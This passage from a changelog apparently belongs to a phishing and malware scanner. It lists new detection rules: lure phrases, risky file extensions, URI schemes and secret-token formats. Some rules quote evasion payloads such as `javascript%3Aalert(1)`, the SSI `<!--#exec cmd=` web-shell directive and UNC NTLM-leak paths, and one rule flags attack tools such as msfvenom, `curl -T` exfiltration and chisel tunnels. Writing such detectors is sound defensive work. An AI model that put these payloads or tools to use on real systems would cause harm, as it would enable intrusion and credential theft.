  http(s)/ftp/file:/UNC makes the shell fetch the icon on VIEW —
  the NTLM credential-leak primitive needs no click. The key
  names exist only in this payload format, so detection is
  extension-independent (+50): a `.txt` carrying the same
  `[InternetShortcut]` body still fires. Local paths
  (`IconFile=C:\Windows\...`) and non-icon keys stay clean.

- **HTML anchor mismatch + defanged indicators in text**
  (`hlse_text.c`): `<a href="http://evil.example">paypal.com</a>`
  gets the same display/target comparison as Markdown links (+45).
  `hxxp://`/`hxxps://` schemes (+35) and bracket-dot domain
  markers — `[.]`, `(.)`, `{.}`, `[dot]`, `(dot)`, `{dot}` —
  (+30) are defang conventions whose only purpose is to make a
  live destination out of a dead string; bracket markers fire
  only between domain characters, so prose like `(.)` alone
  stays clean.

- **Markdown link display/target mismatch + UNC path lures in
  text** (`hlse_text.c`): `[paypal.com](http://evil.example)` — the
  rendered text claims one domain while the link goes elsewhere —
  fires +45 when the display text is itself domain-shaped and its
  domain neither equals nor is a parent of the target host
  (subdomains and same-host links stay clean, as does non-domain
  display text like `[docs](...)`). A UNC path `\\host\share` in a
  message body fires +40 — opening it leaks the reader's NTLM hash
  and can deliver hostile `.lnk` payloads; device namespaces
  (`\\.`, `\\?`, `\\localhost`, `\\127.*`) are excluded.

- **Mixed-script domain lookalikes in message text**
  (`hlse_text.c`): `http://рaypal.com` was caught by the URL
  engine, but a bare `рaypal.com` inside a message body never
  reached it — the text pipeline's own homoglyph fold erased
  the evidence before keyword matching. A new pre-normalization
  pass walks whitespace-separated tokens: non-ASCII bytes +
  domain-shaped ASCII after the confusable/decorated fold +
  raw≠normalized → +40. The decorated fold covers Mathematical
  Alphanumeric Symbols (𝖕𝖆𝖞𝖕𝖆𝖑/𝐩𝐚𝐲𝐩𝐚𝐥), circled (ⓟⓐⓨⓟⓐⓛ),
  parenthesized (⒫⒜⒴), and small-caps/letterlikes (ᴘᴀʏᴘᴀʟ).
  Genuine IDN wording (`münchen.de`, `café.fr`, plain Cyrillic
  words) survives the folds unchanged and stays clean.

- **E6: From-domain typosquat detection** (`hlse_secrets.c`,
  `email` forensics): E1 covered brands claimed in the display
  name; the sender DOMAIN itself is now checked for lookalikes —
  `billing@amaz0n.example`, `mail.microsft.example`, `paypa1.*`.
  Two squat classes only (+45): leet/digit substitution that
  normalizes to a brand (0→o 1→l 3→e 5→s 7→t $→s @→a) and
  Damerau distance 1. Exact-match labels are skipped
  (`support.x.com` is wording, not a lookalike) and the brand
  table excludes distance-1 collisions with ordinary words
  (`gmail`~mail, `binance`~finance, `chase`~phase, `usps`~ups).

- **Paste/LOLBin residual coverage** (`hlse_supply.c`, P8 +45):
  `msfvenom` (payload generation — no benign paste context),
  `installutil /u` (the uninstall path executes the same .NET
  AppDomain code as install), `dnscmd /serverlevelplugindll`
  (DNS-server DLL load persistence), `curl -T/--upload-*`
  (data exfiltration channel — download-side `-o` was already
  covered), and `chisel client|server` (reverse tunnel / covert
  channel).

- **`cifs:`/`x11:` mount-class + `daytime:`/`chargen:` legacy
  schemes** (`hlse_core.c`): `cifs:` joins `smb:` in the
  remote-mount set at +55 — it IS the SMB alias, so the
  UNC/NetNTLM-leak verdict now applies to both spellings.
  `x11:` opens an X Window connection to an attacker display
  (remote-session class, +40). `daytime:`/`chargen:` (RFC
  867/864 echo ports) join the legacy-fetch table (+30).

- **SSI/XHTML web-code carriers + `<!--#exec` content rule**
  (`hlse_file.c`): `.shtm`/`.shtml`/`.stm`/`.xhtml` join the
  server-side code-carrier set (F3, +30) — SSI files execute
  `<!--#exec cmd= -->` under the web server user (classic
  web-shell delivery), `.xhtml` runs script in XML mode. A new
  extension-independent content check (F5b, +55) flags the
  `<!--#exec` primitive in ANY file — the directive has no
  benign purpose in shipped content. `.svgz` joins the image
  extension set so scripted/polyglot SVG gzip streams hit the
  same F2/F5 rules as `.svg`.

- **UTS-46 host normalization** (`hlse_core.c`): the authority
  span now normalizes what resolvers normalize — ideographic/
  fullwidth/halfwidth dots (。．｡) fold to `.` (+30) and
  invisible format characters (ZWSP/ZWNJ/ZWJ, NBSP, soft hyphen,
  ideographic space, BOM) are dropped (+35 — never legitimate
  host bytes, present only to make the raw string differ from
  the resolved one). Fullwidth ASCII letters are deliberately
  NOT folded here — `detect_mixed_script` already names the
  brand they resemble, and folding first would silence that
  richer reason. Only the authority is normalized — path/query
  Unicode is untouched.

- **Partial %-encoded scheme + NUL-truncation evasion**
  (`hlse_core.c`): the decode-and-redispatch path only ran when
  input STARTED with '%', so `javascript%3Aalert(1)` and
  `jav%61script:` passed the scheme gate raw while any
  decode-first consumer resolved them. Decode now runs whenever
  '%' is present; partial encodings dispatch only on
  dangerous/handler schemes (a decoded plain http(s) URL is an
  ordinary link). `%00` in a host truncates the decoded string at
  the NUL — flagged +40 as a destination-laundering tell, and
  decoded tab/LF/CR are dropped during decode for the
  decode-then-parse pipeline case (+40 "percent-encoded
  dangerous scheme").

- **Control-char-embedded scheme evasion** (`hlse_core.c`):
  WHATWG strips ASCII tab/LF/CR anywhere in a URL before
  parsing, so `java\tscript:alert(1)` executes exactly like
  `javascript:alert(1)` — but the embedded control char hid the
  scheme from both `hlse_scan`'s prefix gate and `check_url`'s
  parser, returning OK. Both entry points now strip `\t\n\r`
  into a bounded copy up front, and `check_url` adds +15
  "WHATWG-strip evasion" when it had to strip. Evasion inputs
  resolve to ISOLATE 90 like their plain forms; a benign
  `http://exa\tmple.com/` still scans clean.

- **Residual private-key formats** (`hlse_secrets.c`): Tectia
  `-----BEGIN SSH2 ENCRYPTED PRIVATE KEY-----`, PEM-wrapped
  `-----BEGIN PKCS12-----` bundles, and PuTTY `.ppk` headers
  `PuTTY-User-Key-File-2:`/`PuTTY-User-Key-File-3:` → ISOLATE 95.

- **Cashback + review + pension-release + domain + rebate lures**
  (`hlse_text.c`): "cash back portal · shopping cashback · earn
  cashback · cashback portal · cash back rewards · cashback site"
  (cashback scams), "leave a review · review incentive · write a
  review · gift for review · free product in exchange · review
  for a gift · honest review · leave us a review" (review
  solicitation), "unlock your pension · early pension access ·
  pension release · early pension · pension unlocking · access
  your pension early · pension liberation" (pension-release
  fraud), "domain broker · premium domain for sale · domain for
  sale · premium domain · buy this domain" (domain cons),
  "insurance rebate · policy rebate · premium rebate · insurance
  refund · premium refund" (insurance-rebate fraud).
- **Residual archive carriers** (`hlse_file.c`): `.z`/`.lz`/
  `.lzo`/`.tz`/`.taz`/`.txz`/`.tlz`/`.tbz`/`.tb2`/`.pax`/`.cpio`/
  `.afsplit` — compress, LZ4/lzip/lzo, tar variants, cpio/pax,
  and Apple FileSystem splits → LOG 30.
- **`webdav:`/`webdavs:` remote-mount schemes** (`hlse_core.c`)
  → LOG 35.

- **Certificate + ambassador + modeling + unban + voucher +
  audition + DNA lures** (`hlse_text.c`): "ielts certificate ·
  toefl score · language certificate · ielts score report ·
  english test certificate · buy ielts · ielts result" (fake
  certificates), "brand ambassador · ambassador program ·
  sponsorship opportunity · become a brand ambassador · free
  products · ambassador invite" (ambassador scams), "modeling
  agency · modeling portfolio · casting call · talent scout ·
  model search · audition casting · casting director" (modeling
  fees), "account unban · appeal your ban · ban appeal · unban
  your account · recover banned account · appeal suspension"
  (unban services), "voucher code · travel voucher · airline
  voucher · free voucher · hotel voucher · redeem voucher · gift
  voucher" (travel vouchers), "audition fee · talent agency ·
  audition registration · audition spot · talent showcase ·
  modeling audition" (paid auditions), "dna test results ·
  ancestry results · genetic test · dna results · ancestry report
  · genetic testing kit" (DNA scams).
- **`acct:`/`doi:` identifier-resolution schemes** (`hlse_core.c`)
  → LOG 35.

- **Childcare + veterans + disability + settlement + survey +
  telecom + reverse-mortgage lures** (`hlse_text.c`): "childcare
  subsidy · child care subsidy · daycare assistance · child care
  benefit · child care credit" (childcare fraud), "disability
  rating · rating increase · veteran claim · pact act" (VA/PACT
  fraud), "ssdi application · disability application · ssdi
  benefits · disability payment" (SSDI scams), "structured
  settlement · annuity payout · pension buyout · cash out your
  pension · cash out your annuity · sell your annuity · pension
  advance" (settlement buyouts), "census survey · survey incentive
  · paid survey · earn rewards · survey rewards · paid to take
  surveys" (paid-survey scams), "internet plan upgrade · cable
  bill discount · speed upgrade · upgrade your internet · loyalty
  discount · your internet plan" (ISP telemarketing), "reverse
  mortgage · hecm loan · equity release · home equity conversion ·
  unlock your equity" (reverse-mortgage elder fraud).
- **`.swf` Flash carrier** (`hlse_file.c`) → LOG 30.
- **`coap:`/`coaps:`/`mqtt:`/`obex:`/`snmp:` IoT/device schemes**
  (`hlse_core.c`) → LOG 35.

- **Fax + copier-scan + calendar + legal + recall + device lures**
  (`hlse_text.c`): "fax received · view your fax · fax waiting ·
  fax notification" (fax/voicemail phishing), "scanned document ·
  copier scan · scan from office · document scanned · scan
  notification · shared scan" (printer-scan lures), "calendar
  invite · meeting invitation · shared calendar · teams meeting
  invite · calendar invitation · meeting reschedule" (calendar
  phishing), "demand letter · cease and desist · legal notice ·
  attorney letter · letter of intent · legal demand" (legal-threat
  extortion), "food recall · product recall · recall alert ·
  salmonella recall · food safety alert · product safety recall ·
  safety recall" (recall fraud), "device location · find my device
  · located your phone · find your phone · your device was
  located" (Find-My-Device lures).
- **`.ipf` InfoPath package carrier** (`hlse_file.c`) → LOG 30.
- **Square `sq0csp-` application secret** (`hlse_secrets.c`)
  → ISOLATE 80.
- **`ms-spd:`/`ms-officeapp:` Office URI handlers**
  (`hlse_core.c`) → LOG 35.

- **Funeral + cruise + water/mold + alarm + seller lures**
  (`hlse_text.c`): "funeral plan · burial plot · memorial plan ·
  funeral pre-need · burial insurance · final expense insurance ·
  pre-need plan · funeral cost" (pre-need funeral fraud), "free
  cruise · cruise voucher · vacation voucher · all-inclusive
  vacation · complimentary cruise · complimentary trip · free
  trip" (vacation scams), "water test results · water quality
  report · lead contamination · free water test · lead test · mold
  inspection · mold remediation · air quality test · black mold ·
  mold removal" (water/mold scares), "security system · alarm
  monitoring · alarm system · free security system · alarm
  monitoring service · home security system" (alarm telemarketing
  fraud), "seller account · seller suspension · seller performance
  · seller verification · seller central · seller metrics ·
  selling account · your selling privileges" (marketplace seller
  phishing).
- **`.searchConnector-ms` search-connector carrier**
  (`hlse_file.c`) — XML pointing to remote/UNC endpoints → LOG 30.
- **Notion `ntn_` integration token** (`hlse_secrets.c`)
  → ISOLATE 80.

- **Estimate + appointment + screening + registration + fundraiser
  lures** (`hlse_text.c`): "contractor estimate · job estimate ·
  final estimate · construction estimate · repair estimate ·
  estimate attached · estimate approval" (fake contractor
  estimates), "reschedule your appointment · appointment
  confirmation · confirm your appointment · appointment reminder ·
  reschedule your visit · confirm your visit" (appointment
  phishing), "pre-employment check · background screening ·
  employment verification · employment screening · pre-employment
  screening" (employment-screening fraud), "registration renewal ·
  vehicle registration · renew your registration · car
  registration · registration expired" (DMV registration scams),
  "gofundme · fundraising campaign · donate to victims ·
  crowdfunding campaign · victim fundraiser" (fake fundraisers).
- **`.slk`/`.dif`/`.oqy`/`.rqy` DDE/query carriers**
  (`hlse_file.c`) — Excel formula-injection + remote-query
  delivery siblings of `.iqy` → LOG 30.

- **Notary + moving + dark-web + bank-merger + home-warranty +
  membership lures** (`hlse_text.c`): "notary fee · notarized
  copy · document notarization · certified notary · notary service ·
  notarization fee" (notarization fees), "moving deposit · movers
  deposit · mover reservation · moving reservation · shipping
  insurance fee" (fake movers), "identity monitoring · your data
  was found · found on the dark web · dark web monitoring · your
  information was found" (dark-web exposure phishing), "bank
  merger · account migration · migrate your account · new banking
  platform · account migration required · banking platform
  migration" (merger migration ruses), "home warranty · home
  warranty plan · home warranty coverage · home protection plan ·
  warranty protection plan" (warranty-renewal fraud), "membership
  cancellation · cancel your membership · membership cancellation
  fee" (membership-refund scams).
- **`.pps`/`.wiz` legacy Office carriers** (`hlse_file.c`)
  → LOG 30.
- **`eudora:` legacy mail-client scheme** (`hlse_core.c`) → LOG 35.

- **Escrow-release + trust + rollover + deed + medical-debt +
  COBRA + audit lures** (`hlse_text.c`): "escrow release · release
  funds from escrow · release the escrow · escrow release form"
  (escrow fraud), "trust disbursement · attorney trust account ·
  disbursement of funds · trust account distribution" (attorney-
  trust BEC), "rollover your 401k · pension rollover · retirement
  rollover · 401k rollover · rollover your ira · ira rollover"
  (retirement phishing), "deed copy · property deed · title
  transfer fee · deed processing · certified copy of your deed ·
  copy of your deed · deed notice" (deed-copy fee scams),
  "medical bill collection · hospital collections · pay your
  medical debt · medical debt payment" (medical-debt fraud),
  "cobra coverage · coverage continuation · elect cobra · cobra
  election · continuation coverage" (COBRA lures), "license
  true-up · software audit notice · license compliance review ·
  software license audit · license compliance · audit your
  licenses" (BSA-style license-audit extortion).
- **Access residual carriers** (`hlse_file.c`): `.mda`/`.mde`/
  `.mdw`/`.accdr` — VBA/OLE siblings of `.mdb`/`.accdb` → LOG 30.
- **`ms-call:`/`wp:` call-launch + WAP schemes** (`hlse_core.c`)
  → LOG 35/30.

- **REAL-ID + no-show + wire-recall + vault + MFA + termination
  lures** (`hlse_text.c`): "real id · real id deadline · real id
  appointment · real id requirement · real id compliant" (DMV
  REAL-ID scams), "missed appointment fee · no-show fee · no show
  fee · missed your appointment" (no-show charge fraud), "wire
  recall · wire transfer recall · payment recall · recall the
  wire · recall the payment · recall notice" (BEC recall
  pretexts), "password manager · your vault · vault compromised ·
  master password reset · vault breach · vault was accessed"
  (password-manager breach phishing), "sign-in attempt blocked ·
  deny the sign-in · deny this attempt · approve the sign-in ·
  approve sign-in · deny the request · wasn't you button" (MFA-
  fatigue denial lures), "termination letter · severance notice ·
  final paycheck · employment is terminated · severance agreement ·
  layoff notice · termination of employment" (HR termination
  malspam).
- **Visio/Excel residual carriers** (`hlse_file.c`): `.vss`/
  `.vssx`/`.vst`/`.vstx` (Visio stencils — OLE objects), `.vstm`
  (macro-enabled Visio template), `.xlb` (Excel toolbar),
  `.xlv` (Excel-4 macro variant) → LOG 30.

- **Pet-deposit + vehicle-deposit + app-fee + class-member +
  DME + Lifeline lures** (`hlse_text.c`): "puppy deposit · pet
  adoption fee · puppy shipping · pet delivery fee · deposit for
  the puppy" (pet scams), "vehicle deposit · car deposit · deposit
  to hold the car · rv deposit · boat deposit" (vehicle-hold
  fraud), "credit check fee · background check fee · rental
  application fee · tenant screening fee · application processing
  fee" (rental screening-fee fraud), "class member · class
  settlement · you are a class member" (class-action hooks —
  'class action settlement'/'settlement payment' already covered),
  "back brace · knee brace · medical equipment · durable medical
  equipment · free brace · orthopedic brace" (DME Medicare fraud),
  "free government phone · lifeline program · free phone · free
  tablet · government phone · lifeline benefit" (Lifeline/ACP
  benefit phishing).
- **Server-side code carriers** (`hlse_file.c`): `.asa`
  (global.asa ASP events), `.inc` (script include), `.plx` (Perl
  executable) → LOG 30.
- **`z39.50:`/`z39.50s:` legacy library protocol**
  (`hlse_core.c`) → LOG 30.

- **Insurance-proof + deposit + rental + debt + loan + selfie
  lures** (`hlse_text.c`): "proof of insurance · insurance card ·
  insurance verification · proof of coverage · auto insurance
  card · insurance id card" (insurance-proof phishing),
  "security deposit return · deposit return · deposit withheld ·
  deposit refund · get your deposit back" (rental deposit scams),
  "vacation rental · airbnb reservation · airbnb booking · vrbo ·
  rental reservation" (booking fraud), "debt validation ·
  collection account · past due balance · pay for delete ·
  collection notice · debt collector · validate your debt · debt
  settlement offer" (FDCPA-collector fraud), "payday loan · cash
  advance approved · instant loan · title loan · quick cash loan"
  (instant-loan lures), "scholarship award · won a scholarship ·
  scholarship selected · scholarship application fee" (scholarship
  hooks), "selfie verification · video selfie · hold your id ·
  take a selfie · photo of your id · selfie with your id"
  (ID-selfie credential harvesting).
- **`.manifest` ClickOnce deployment manifest** (`hlse_file.c`)
  → LOG 30 — the sibling of `.application` carrying the payload
  reference.
- **`pres:` IMPP presence scheme** (`hlse_core.c`) → LOG 35 —
  sibling of `im:`.
- **`pk_` Klaviyo private API key** (`hlse_secrets.c`) →
  ISOLATE 80 (pk_ + 32 hex; min_suffix=30 keeps Stripe
  `pk_live_`/`pk_test_` at 29-char suffix on their own rows).

- **Pharmacy + credit-limit + Medicare + settlement lures**
  (`hlse_text.c`): "prescription refill · medication recall ·
  pharmacy order · rx order · your prescription · prescription
  ready" (pharmacy phishing), "credit limit increase · credit line
  increase · higher credit limit · credit increase · increase your
  limit" (fake credit offers), "medicare advantage · medicare plan ·
  switch your coverage · medicaid renewal · medicare card"
  (Medicare Advantage enrollment fraud), "claim settlement ·
  settlement offer · insurance payout · settlement amount · payout
  approved" (fake claim-settlement lures).

- **Court-appearance + lab-results + voter + aid lures**
  (`hlse_text.c`): "court date · court appearance · court hearing ·
  arraignment · court summons · missed court" (fake court
  notifications), "lab results · test results · pathology report ·
  lab report · medical records · radiology report" (health-lure
  phishing), "voter registration · register to vote · voter id ·
  absentee ballot · voter information · polling place" (election
  scams), "financial aid · aid package · aid disbursement"
  (FAFSA/aid fraud — the core fafsa/student-aid/pell-grant words
  were already covered).
- **Installer-script carriers** (`hlse_file.c`): `.nsi`/`.nsh`
  (NSIS), `.iss`/`.isl` (Inno Setup), `.wxs` (WiX) — installer
  scripts embed executable sections abused as droppers → LOG 30.

- **Tax-assessment + HOA + military-leave lures** (`hlse_text.c`):
  "tax assessment · tax reassessment · assessment appeal · property
  tax bill" (fake county assessor), "hoa violation · homeowners
  association · association fee" (HOA fee scams), "license
  suspension · driving privileges · suspended license · license
  reinstatement" (DMV scares), "military leave · leave request
  form · leave application · deployment extension · fiancee form ·
  leave processing fee" (military-romance leave-fee fraud).
- **AutoIt + VB6 script carriers** (`hlse_file.c`): `.au3`/`.a3x`
  (AutoIt — classic dropper language), `.kix` (KiXtart logon
  script), `.frm`/`.bas`/`.cls`/`.vbp` (VB6-era code carriers)
  → LOG 30.
- **`web+` protocol-registration schemes** (`hlse_core.c`):
  `web+mail:`/`web+cal:`/`web+login:` — site-registered handler
  launch surface → LOG 30.

- **Points-expiry variants + visa-appointment lures**
  (`hlse_text.c`): "points expiring · miles expiring/expire ·
  redeem them · cash out your points" (the -ing forms missed by
  'points expire') and "visa appointment · appointment slot ·
  visa slot · booking fee · expedite your visa · priority
  appointment · interview slot · booking fee required" (fake
  consulate/interview slot-booking fees).

- **Bail-bond + dormant-account + payroll lures** (`hlse_text.c`):
  "bail money · post bail · bond payment · bail bond" (grandparent
  scams), "inactive/dormant account · account reactivation ·
  reactivation fee" (closure-fee phishing), "payroll correction/
  error · salary adjustment · paycheck correction · payroll
  discrepancy" (BEC payroll-diversion).
- **HD-wallet key variants** (`hlse_secrets.c`): `ypub`/`zpub`/
  `tpub` (segwit + testnet public keys → LOG/ALERT 40-50) and
  `yprv`/`zprv`/`tprv` (segwit + testnet master keys → ISOLATE
  90-95), siblings of `xprv`/`xpub`.
- **`ipp:`/`ipps:`/`lpd:` URI handlers** (`hlse_core.c`):
  network-print protocols — remote-printer install is a
  driver/PPD payload channel → LOG 30.
- **S/MIME carriers** (`hlse_file.c`): `.p7m` (enveloped message
  with full attachments) + `.p7s` (detached signature veneer)
  → LOG 30.

- **Gold-bar courier + benefit-credit lures** (`hlse_text.c`):
  "gold bar(s) · precious metals · courier will collect · hand it
  to our · our agent will pick up · liquidate your assets ·
  convert to gold" (FBI-warned gold-courier fraud), "child tax
  credit · tax credit advance/payment", "hospital/medical bill
  forgiveness".
- **`xoxr-` Slack refresh token** (`hlse_secrets.c`) → ISOLATE 85.
- **`sips:`/`office:`/`feeds:`/`rtspu:` URI handlers**
  (`hlse_core.c`): TLS SIP sibling (LOG 35, same band as `sip:`),
  Office deep-link, feeds:/rtspu: legacy+streaming variants.
- **Outlook message carriers** (`hlse_file.c`): `.otm` (VBA
  macro-capable mail template), `.oft` (scripted custom form),
  `.nws` (OE news-message sibling of `.eml`) → LOG 30.

- **Digital-arrest + energy-audit + document lures** (`hlse_text.c`):
  "digital arrest · stay on the video call · video call
  verification · you are under arrest" (video-call detention scam),
  "free energy audit · energy audit · home energy check", and
  "irs/tax transcript · dmv appointment · license renewal online"
  (government-document phishing).
- **`sl.` Dropbox OAuth token + `xoxo-` Slack OAuth token**
  (`hlse_secrets.c`) → ISOLATE 85.
- **`play:` URI-handler flagging** (`hlse_core.c`): Play-store
  deep-link sibling of `market:` → LOG 35.
- **Niche ODF carriers** (`hlse_file.c`): `.odg`/`.odb`/`.odf` —
  macro-capable LibreOffice draw/database formats → LOG 30
  (`.odt`/`.ods`/`.odp` stay safe-listed with `.docx`/`.xlsx`).

- **Solar-rebate + KYC-refresh + smart-meter lures** (`hlse_text.c`):
  "free solar · solar rebate/program · government solar" (subsidy
  fraud), "account review · periodic/annual review · kyc refresh ·
  customer due diligence" (bank KYC-refresh phishing), and "smart
  meter · meter upgrade/replacement" (fake utility notices).
- **`itunes:` URI-handler flagging** (`hlse_core.c`): iTunes store
  deep-link sibling of `itms:` → LOG 35.
- **StarOffice 1.x carriers** (`hlse_file.c`): `.sxc`/`.sxi`/`.sdd`/
  `.sxw`/`.sxm` — pre-ODF OpenOffice formats carrying macros + OLE
  objects → LOG 30.

- **Relief-payment + flight-compensation lures** (`hlse_text.c`):
  "stimulus check/payment · tariff rebate/dividend · inflation
  relief · relief payment" (fake-payout phishing collecting
  SSN/bank details) and "flight delay compensation · airline
  compensation · compensation claim · employee discount
  program" (EU261/benefit lures).
- **Slack token variants** (`hlse_secrets.c`): `xoxe-`
  single-segment rotation token → ISOLATE 85, `xoxa-` app
  token → ISOLATE 80.
- **Script extension coverage** (`hlse_file.c`): `.mjs`/`.cjs`
  (Node module extensions — same carrier class as `.js`),
  `.ksh` (Korn shell), `.pssc`/`.psrc` (PowerShell session
  config + JEA resource files) → LOG 30.

- **Shopper / NFT-drainer / mortgage-relief lures** (`hlse_text.c`):
  "secret shopper · shopper assignment/evaluation" (check-cashing
  advance-fee), "nft mint · free mint · whitelist spot · mint your
  free · claim your airdrop · airdrop claim" (wallet-drainer mint
  pages), "mortgage relief · loan modification · vehicle purchase
  protection · car/auto escrow" (financial-fraud lures).
- **`mlsn.` MailerSend API key** (`hlse_secrets.c`) → ISOLATE 80.
- **`.esd`/`.ffu` Windows deployment images** (`hlse_file.c`):
  Electronic Software Delivery + Full Flash Update install-image
  carriers → LOG 30 (same class as `.wim`).

- **Timeshare-exit + utility-shutoff variants** (`hlse_text.c`):
  "timeshare exit · exit your timeshare · timeshare cancellation ·
  cancel your timeshare · timeshare relief/resale/contract"
  (timeshare-exit advance-fee fraud) and "power/utility/electricity/
  water disconnection · utility shutoff" (shutoff-scam variants).
- **PostScript + metafile extensions** (`hlse_file.c`): `.ps`/`.eps`
  (full scripting language rendered by Ghostscript/Preview — rich
  RCE history) and `.wmf`/`.emf` (executable Escape records —
  MS05-053 class) → LOG 30.
- **`applescript:` URI-handler flagging** (`hlse_core.c`): macOS
  AppleScript URI hands script text to the Script Editor run path
  → LOG 35.
- **Domain-registration / trademark / charity vocab**
  (`hlse_text.c`): "domain registration · renew your domain ·
  domain renewal · lose your domain · domain transfer · trademark
  registration/notice/violation/infringement · uspto · google
  business profile · business listing · listing verification"
  (fake renewal + USPTO + Google-Business notices) and "donate
  now · disaster relief · victims fund · relief effort ·
  emergency appeal · charity appeal · donation appeal"
  (disaster-relief donation bait).
- **`.ws` extension** (`hlse_file.c`): Windows Script file —
  a real WSH executable extension alongside .wsf/.wsh → LOG 30.
- **Page-removal + account-recovery vocab** (`hlse_text.c`):
  "scheduled for removal · page removal · will be unpublished ·
  content removal notice · copyright removal · submit/file an
  appeal · respond to this notice" (fake Meta/Instagram
  copyright-takedown phishing) plus "was this you · wasn't/was not
  you · did you request · secure your account · recognize this
  activity · if this wasn't/was not you" (sign-in-notification
  recovery hooks).
- **`dav:`/`davs:` URI-handler flagging** (`hlse_core.c`): WebDAV
  remote-mount schemes — used with search-ms to host stageless
  payloads and leak NetNTLM (same class as smb:/afp:/nfs:) →
  ALERT 40.
- **`sk-or-v1-`** (`hlse_secrets.c`): OpenRouter API key
  (64-hex suffix) → ISOLATE 85.
- **Jury-duty / funeral / unemployment vocab** (`hlse_text.c`):
  "jury duty · jury summons · failure to appear · bench warrant ·
  contempt of court" (fake-summons callback scams), "funeral
  service · funeral notice · memorial service · celebration of
  life · obituary · condolences · funeral expenses · memorial
  fund" (funeral-notice malspam + memorial-donation scams), and
  "unemployment claim · unemployment insurance · filed for
  unemployment · unemployment payment" (UI-claim phishing).
- **Health-insurance enrollment vocab** (`hlse_text.c`): "open
  enrollment · enrollment period · health insurance/coverage ·
  coverage options · insurance marketplace · compare plans ·
  enroll in coverage · coverage may change · plan renewal" — fake
  ACA/marketplace enrollment notices that harvest identity data.
- **`AGE-SECRET-KEY-` + `AGE-PLUGIN-X25519-`** (`hlse_secrets.c`):
  age encryption secret key and X25519 plugin secrets (bech32).
- **Incident/device/dispute vocab** (`hlse_text.c`): "security
  incident · incident report · breach notification · data incident"
  (fake breach alerts), "a new device · unfamiliar sign-in ·
  unrecognized device · new sign-in · signed in from" (device
  alerts), "chargeback · dispute opened · payment dispute ·
  transaction dispute · case was opened" (marketplace disputes).
- **`NRBR-`/`NRRA-`/`NRDR-`** (`hlse_secrets.c`): New Relic browser
  license, REST admin, and legacy insights-insert keys.
- **Tax-document + retirement vocab** (`hlse_text.c`): "w-2 · w2
  form · 1099 form · tax document/form · wage statement" (SSN-
  harvesting tax-doc lures) plus "pension payout · retirement
  account/statement · 401k/403b · ira distribution · annuity
  payment · social security/ssa statement" (retirement phishing).
- **VCS/secure-copy schemes** (`hlse_core.c`): `bzr:`, `fossil:`,
  `cvs:`, `scp:` — remote-repo fetch and remote-file pull handlers.
- **Policy-update + mailbox-deactivation vocab** (`hlse_text.c`):
  "terms of service · updated terms · privacy policy/update ·
  changes to our terms · accept/review the new/updated terms" plus
  "your mailbox · upgrade your mailbox · email/account will be
  deactivated · mailbox storage · re-activate your email".
- **`joinskype:`** (`hlse_core.c`): Skype call/join deep link —
  conferencing-lure channel switch.
- **Unclaimed-property + credit-freeze vocab** (`hlse_text.c`):
  "unclaimed property/money/funds/deposit · abandoned property ·
  escheatment · money owed to you" (escheat scams) plus "credit
  freeze · security freeze · fraud alert · credit monitoring ·
  identity theft protection · credit file" (fake fraud-alert
  notifications).
- **Shopify token family** (`hlse_secrets.c`): `shpat_` (Admin API),
  `shppa_` (app token), `shpss_` (shared secret), `shpca_` (client
  credential) — 32-hex suffix, store admin/customer-data access.
- **`.mad`/`.maf`/`.mam`/`.maq`/`.mat`/`.maw`** (`hlse_file.c`):
  MS Access project/macro/query carriers — VBA-capable containers
  in the same class as `.mdb`/`.accdb`.
- **Student-aid + veterans-benefits vocab** (`hlse_text.c`): "fafsa ·
  student aid · student loan · pell grant · financial aid package ·
  student grant" plus "va claim · veterans benefits · va disability ·
  disability benefits · gi bill · military records · disability
  claim" — benefit phishing that harvests SSN and banking data.
- **Remote-workspace client schemes** (`hlse_core.c`): `receiver:`,
  `citrix:`, `workspaces:` — Citrix Receiver / Workspace App handlers.
- **`.ots`/`.ott`/`.otg`/`.stw`** (`hlse_file.c`): OpenDocument and
  legacy StarOffice templates — macro-capable attachment carriers.
- **`ck_` + `cs_`** (`hlse_secrets.c`): WooCommerce REST consumer
  key/secret (40-hex) — full read/write over store orders and
  customer data.
- **Real-estate closing BEC vocab** (`hlse_text.c`): "escrow ·
  closing instructions · closing disclosure · wire instructions ·
  earnest money · title company · settlement agent · notarized
  document · power of attorney · deed transfer" — the single
  highest-value wire-fraud shape (home-purchase diversion).
- **Messenger deep-link schemes** (`hlse_core.c`): `wire:`, `icq:`,
  `kik:`, `element:`, `matrix:` — off-platform channel-switch lures.
- **`.wbk`** (`hlse_file.c`): Word auto-backup — a full .doc clone
  that can carry macros as an innocuous attachment.
- **Traffic-ticket lure vocab** (`hlse_text.c`): "parking ticket ·
  traffic citation · speed camera · red light camera · photo radar ·
  citation payment · pay your ticket · unpaid citation" — fake
  citation notices demanding online payment (card-harvesting).
- **`ms-infopath:`** (`hlse_core.c`): legacy InfoPath form handler.
- **`hvs.` + `hvb.`** (`hlse_secrets.c`): HashiCorp Vault service
  and batch tokens (root/admin capability for the secrets engine).
- **Travel/eviction/employment-screening vocab** (`hlse_text.c`):
  "flight check-in · check in online · boarding pass" (airline
  check-in phishing), "eviction notice/proceedings · vacate the
  premises" (eviction lures), "background check · employment
  screening · verify your identity for employment" (SSN-harvesting
  job screens), "dental coverage · vision insurance/plan" (benefit
  update phishing).
- **Remote-access tool URL schemes** (`hlse_core.c`): `teamviewer:`,
  `anydesk:`, `rustdesk:`, `airdroid:` — clicking launches the named
  remote-desktop client (tech-support scam delivery).
- **`.shb`** (`hlse_file.c`): Windows ShellScrap object file — a
  documented shortcut-binary malware carrier.
- **`IGQWR` + `hbp_`** (`hlse_secrets.c`): Instagram Graph API token
  and Honeybadger project API key.
- **Settlement-claim + immigration-scam vocab** (`hlse_text.c`):
  "settlement claim · claim your share · class action settlement ·
  data breach settlement · settlement payment · eligible for the
  settlement · claim form · file a claim" (Equifax-style fake payout
  bait), plus "visa application · immigration status · green card ·
  work permit · visa lottery · diversity visa · immigration/visa fee"
  (immigration advance-fee fraud).
- **`phc_` PostHog project API key** (`hlse_secrets.c`).
- **`.zipx`** (`hlse_file.c`): WinZip extended archive — same
  carrier class as `.zip`/`.rar`/`.7z`.
- **IoT-notification + booking + billing-failure vocab**
  (`hlse_text.c`): "motion detected · camera detected · doorbell
  camera · security camera · someone is at your door · person
  detected" (fake Ring/Nest-style camera alerts), "booking
  confirmation · reservation confirmed · verify your booking/
  reservation" (travel-booking malspam), "subscription could not be
  charged · payment failed · unable to process your payment ·
  update your payment method · billing information" (payment-failure
  card phishing), and "service will be interrupted / disconnected ·
  service outage" (ISP outage lures).
- **`.flatpak` + `.snap`** (`hlse_file.c`): Linux app-installer
